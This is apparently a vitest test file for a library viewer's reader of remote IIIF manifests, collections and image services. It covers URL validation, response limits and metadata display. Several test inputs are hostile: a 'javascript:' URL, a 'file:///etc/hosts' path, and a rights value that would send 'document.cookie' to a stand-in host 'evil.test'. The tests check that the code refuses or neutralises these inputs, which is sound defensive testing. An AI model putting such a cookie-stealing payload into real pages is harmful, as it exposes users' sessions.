import { describe, expect, it } from 'vitest';

import { imageService3, rejection } from '../test-support.js';
import { describeRemoteResource } from './describe-resource';
import { ParserBoundaryError, imageServiceUriCrossingBoundary } from './parser-boundary';
import {
	REMOTE_IIIF_LIMITS,
	RemoteIiifRejectedError,
	RemoteImageResponseError,
	readRemoteIiifResource,
	remoteIiifUrl
} from './remote-resource';

const json = (body: unknown, init?: ResponseInit) =>
	new Response(JSON.stringify(body), {
		headers: { 'content-type': 'application/json' },
		...init
	});

const ATLAS = 'https://library.example.test/iiif/atlas/manifest.json';
const answering = (body: unknown) => async () => json(body);

const refused = (url: string, options: Parameters<typeof readRemoteIiifResource>[1]) =>
	rejection(RemoteIiifRejectedError, readRemoteIiifResource(url, options));

const described = async (document: unknown) => {
	const resource = await readRemoteIiifResource(ATLAS, { fetch: answering(document) });
	return describeRemoteResource(resource.parsed, resource.document);
};

const manifest = (canvases: number, extra: Record<string, unknown> = {}) => ({
	'@context': 'http://iiif.io/api/presentation/3/context.json',
	id: 'https://library.example.test/iiif/atlas/manifest.json',
	type: 'Manifest',
	label: { en: ['A Sea Atlas'] },
	summary: { en: ['Charts of the western approaches.'] },
	metadata: [
		{ label: { en: ['Date'] }, value: { en: ['1657'] } },
		{ label: { en: ['Shelfmark'] }, value: { none: ['MS 44'] } }
	],
	requiredStatement: {
		label: { en: ['Attribution'] },
		value: { en: ['Provided by the Example Library. CC BY 4.0.'] }
	},
	rights: 'http://creativecommons.org/licenses/by/4.0/',
	...extra,
	items: Array.from({ length: canvases }, (_, index) => {
		const at = (kind: string) => `https://library.example.test/iiif/atlas/${kind}/${index + 1}`;
		const service = `https://images.example.test/iiif/3/sheet-${index + 1}`;
		const body = {
			id: `${service}/full/max/0/default.jpg`,
			type: 'Image',
			format: 'image/jpeg',
			width: 1200,
			height: 851,
			service: [{ id: service, type: 'ImageService3', profile: 'level2' }]
		};
		const painting = {
			id: at('annotation'),
			type: 'Annotation',
			motivation: 'painting',
			target: at('canvas'),
			body
		};
		return {
			id: at('canvas'),
			type: 'Canvas',
			label: { none: [`Sheet ${index + 1}`] },
			width: 1200,
			height: 851,
			items: [{ id: at('page'), type: 'AnnotationPage', items: [painting] }]
		};
	})
});

describe('the URL a user pasted', () => {
	it.each([
		['', /Paste the address/],
		['not a url', /is not a web address/],
		['/iiif/image/info.json', /is not a web address/],
		['data:application/json,{}', /Only https:\/\/ and http:\/\//],
		['file:///etc/hosts', /Only https:\/\/ and http:\/\//],
		['javascript:alert(1)', /Only https:\/\/ and http:\/\//]
	])('refuses %s', (input, expected) => {
		expect(() => remoteIiifUrl(input)).toThrow(expected);
	});

	it('refuses a URL carrying credentials rather than storing somebody’s password', () => {
		const pasted = () => remoteIiifUrl('https://reader:s3cret@library.example.test/iiif/x');
		expect(pasted).toThrow(/carries a username or password/);
		expect(pasted).toThrow(/https:\/\/library\.example\.test\/iiif\/x/);
	});

	it('strips a fragment, because a viewer deep link is what people copy', () => {
		expect(remoteIiifUrl('https://library.example.test/iiif/x#?xywh=0,0,10,10').href).toBe(
			'https://library.example.test/iiif/x'
		);
	});
});

describe('a document from somebody else’s server', () => {
	it('accepts a Manifest, a Collection, and a bare image service through one call', async () => {
		const documents: Record<string, unknown> = {
			[ATLAS]: manifest(3),
			'https://library.example.test/iiif/collection': {
				'@context': 'http://iiif.io/api/presentation/3/context.json',
				id: 'https://library.example.test/iiif/collection',
				type: 'Collection',
				label: { en: ['Maps of the Low Countries'] },
				items: [{ id: ATLAS, type: 'Manifest', label: { en: ['A Sea Atlas'] } }]
			},
			'https://images.example.test/iiif/3/sheet-1/info.json': imageService3({
				id: 'https://images.example.test/iiif/3/sheet-1',
				profile: 'level2',
				width: 1200,
				height: 851,
				tiles: [{ width: 256, height: 256, scaleFactors: [1, 2, 4, 8] }]
			})
		};
		const fetch = async (input: Request | string | URL) =>
			json(documents[String(input)] ?? { error: 'no' });
		const kind = async (url: string) => (await readRemoteIiifResource(url, { fetch })).kind;
		expect(await kind(ATLAS)).toBe('manifest');
		expect(await kind('https://library.example.test/iiif/collection')).toBe('collection');
		expect(await kind('https://images.example.test/iiif/3/sheet-1/info.json')).toBe('image');
	});

	it('names an HTML response for what it is, rather than reporting a JSON syntax error', async () => {
		const failure = await refused('https://library.example.test/maps/1657', {
			fetch: async () =>
				new Response('<!DOCTYPE html><title>Not found</title>', {
					headers: { 'content-type': 'text/html; charset=utf-8' }
				})
		});

		expect(failure.host).toBe('library.example.test');
		expect(failure.message).toContain('sent a web page rather than a IIIF description');
		expect(failure.message).not.toContain('JSON');
	});

	it('names an image file for what it is, before it reads a byte of it', async () => {
		const failure = await rejection(
			RemoteImageResponseError,
			readRemoteIiifResource('https://images.example.test/maps/la-floride.jpg', {
				fetch: async () =>
					new Response(
						new ReadableStream<Uint8Array>({
							pull(controller) {
								controller.enqueue(new Uint8Array(1024).fill(0xff));
							}
						}),
						{ headers: { 'content-type': 'image/jpeg' } }
					)
			})
		);

		expect(failure.contentType).toBe('image/jpeg');
		expect(failure.host).toBe('images.example.test');
		expect(failure.message).not.toContain('past what Ballastella will read');
	});

	it('stops reading a response larger than the bound, a default one, without believing content-length', async () => {
		expect(REMOTE_IIIF_LIMITS.documentBytes).toBeGreaterThan(0);
		expect(REMOTE_IIIF_LIMITS.timeoutMs).toBeGreaterThan(0);
		let chunksSent = 0;
		const failure = await refused('https://library.example.test/iiif/endless', {
			limits: { documentBytes: 4096 },
			fetch: async () =>
				new Response(
					new ReadableStream<Uint8Array>({
						pull(controller) {
							chunksSent += 1;
							controller.enqueue(new Uint8Array(1024).fill(0x20));
						}
					}),
					{ headers: { 'content-type': 'application/json', 'content-length': '12' } }
				)
		});

		expect(failure.message).toContain('past what Ballastella will read');
		expect(chunksSent).toBeLessThan(10);
	});

	it('refuses a Manifest with more canvases than it will browse', async () => {
		const failure = await refused(ATLAS, {
			limits: { canvases: 4 },
			fetch: answering(manifest(9))
		});

		expect(failure.message).toContain('lists 9 canvases');
		expect(failure.message).toContain('Nothing has been added');
	});

	it('reports the status a server answered with', async () => {
		const failure = await refused('https://library.example.test/iiif/gone', {
			fetch: async () => json({}, { status: 503, statusText: 'Service Unavailable' })
		});

		expect(failure.message).toContain('answered 503 Service Unavailable');
	});
});

describe('what a selection pane is shown', () => {
	it('reads a Manifest’s label, summary, metadata, rights, and attribution', async () => {
		const atlas = await described(manifest(2));
		expect(atlas.label).toBe('A Sea Atlas');
		expect(atlas.summary).toBe('Charts of the western approaches.');
		expect(atlas.metadata).toEqual([
			{ label: 'Date', value: '1657' },
			{ label: 'Shelfmark', value: 'MS 44' }
		]);
		expect(atlas.rights).toBe('http://creativecommons.org/licenses/by/4.0/');
		expect(atlas.attribution).toEqual({
			label: 'Attribution',
			value: 'Provided by the Example Library. CC BY 4.0.'
		});
	});

	it('reads Presentation 2’s `license` as rights, because a library that has not migrated still said so', async () => {
		const atlas = await described({
			...manifest(1, { license: 'https://rightsstatements.org/vocab/InC/1.0/' }),
			rights: undefined
		});

		expect(atlas.rights).toBe('https://rightsstatements.org/vocab/InC/1.0/');
	});

	it('keeps a real rights statement clickable, and refuses to make a javascript: one so', async () => {
		expect((await described(manifest(1))).rightsLink).toBe(
			'http://creativecommons.org/licenses/by/4.0/'
		);
		const rights = 'javascript:fetch("https://evil.test/"+document.cookie)';
		const atlas = await described({ ...manifest(1), rights });
		expect(atlas.rights).toBe(rights);
		expect(atlas.rightsLink).toBe('');
	});

	it('lists each canvas with the image service URI that will cross the boundary', async () => {
		const { canvases } = await described(manifest(3));

		expect(canvases).toHaveLength(3);
		expect(canvases[1]).toEqual({
			uri: 'https://library.example.test/iiif/atlas/canvas/2',
			label: 'Sheet 2',
			imageService: 'https://images.example.test/iiif/3/sheet-2',
			width: 1200,
			height: 851
		});
	});

	it('numbers an unlabelled canvas rather than showing a blank row', async () => {
		const document = manifest(2) as { items: { label?: unknown }[] };
		delete document.items[0]!.label;
		expect((await described(document)).canvases[0]?.label).toBe('Image 1');
	});
});

describe('the parser boundary', () => {
	it.each([
		'https://images.example.test/iiif/3/sheet-1',
		'https://images.example.test/iiif/3/sheet-1/',
		'https://images.example.test/iiif/3/sheet-1/info.json',
		'  https://images.example.test/iiif/3/sheet-1#canvas  '
	])('lets one service across, spelled one way however it was written: %s', (written) => {
		expect(imageServiceUriCrossingBoundary(written)).toBe(
			'https://images.example.test/iiif/3/sheet-1'
		);
	});

	it('refuses a parsed object, which is the mistake that would otherwise compile', async () => {
		const resource = await readRemoteIiifResource(ATLAS, { fetch: answering(manifest(1)) });
		const canvas = resource.parsed.type === 'manifest' ? resource.parsed.canvases[0] : null;
		const crossing = () => imageServiceUriCrossingBoundary(canvas);
		expect(crossing).toThrow(ParserBoundaryError);
		expect(crossing).toThrow(/parsed Canvas object/);
		expect(crossing).toThrow(/ADR-0018/);
	});

	it.each([
		['an EmbeddedImage-shaped wrapper', { uri: 'https://images.example.test/iiif/3/sheet-1' }],
		['an array of URIs', ['https://images.example.test/iiif/3/sheet-1']],
		['null', null],
		['undefined', undefined],
		['a number', 42]
	])('refuses %s', (_what, value) => {
		expect(() => imageServiceUriCrossingBoundary(value)).toThrow(ParserBoundaryError);
	});

	it('explains a canvas that paints nothing alignable, rather than reporting a bug', () => {
		expect(() => imageServiceUriCrossingBoundary('')).toThrow(RemoteIiifRejectedError);
		expect(() => imageServiceUriCrossingBoundary('   ')).toThrow(
			/does not paint a IIIF image service/
		);
	});

	it('applies the same URL rules as a pasted address', () => {
		expect(() => imageServiceUriCrossingBoundary('data:image/png;base64,AAAA')).toThrow(
			/Only https:\/\/ and http:\/\//
		);
	});
});

describe('a IIIF image description with no tiles', () => {
	const refusal = (document: unknown) =>
		refused('https://library.example.test/iiif/3/sheet/info.json', { fetch: answering(document) });

	const sizesOnly = (extra: Record<string, unknown>) => ({
		id: 'https://library.example.test/iiif/3/sheet',
		width: 1200,
		height: 851,
		sizes: [{ width: 1200, height: 851 }],
		...extra
	});

	it('is refused as a tiling problem, naming the host and what can be done', async () => {
		const failure = await refusal(imageService3(sizesOnly({})));
		expect(failure.host).toBe('library.example.test');
		expect(failure.message).toContain('publishes no tiles');
		expect(failure.message).toContain('does not support tiles or custom regions and sizes');
		expect(failure.message).toContain('add it from a file');
		expect(failure.message).not.toContain('not a IIIF Manifest');
		expect(failure.message).not.toContain('viewer page');
	});

	it.each([
		['an Image API 2 @context', { '@context': 'http://iiif.io/api/image/2/context.json' }],
		['an Image API 2 @type', { '@type': 'ImageService2' }],
		['only the image protocol', { protocol: 'http://iiif.io/api/image' }]
	])('recognises the shape from %s alone', async (_what, marker) => {
		expect((await refusal(sizesOnly(marker))).message).toContain('publishes no tiles');
	});

	it('still says "not a IIIF resource" for a document that is not one', async () => {
		const failure = await refusal({ hello: 'this is not IIIF at all' });
		expect(failure.message).toContain('not a IIIF Manifest, Collection, or image description');
		expect(failure.message).toContain('viewer page');
		expect(failure.message).not.toContain('publishes no tiles');
	});
});
